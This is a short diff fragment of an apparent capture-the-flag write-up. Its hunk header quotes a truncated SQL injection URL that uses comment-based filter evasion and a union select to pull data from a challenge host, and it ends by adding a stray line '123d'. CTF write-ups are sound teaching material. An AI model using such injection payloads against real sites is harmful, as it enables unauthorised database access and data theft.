@@ -278,3 +278,4 @@ http://node7.anna.nssctf.cn:29355/?wllm=-1'union/**/select/**/1,2,mid(group_conc
 ```
 ![alt text](image-76.png)
 拼接起来得到flag
+123d
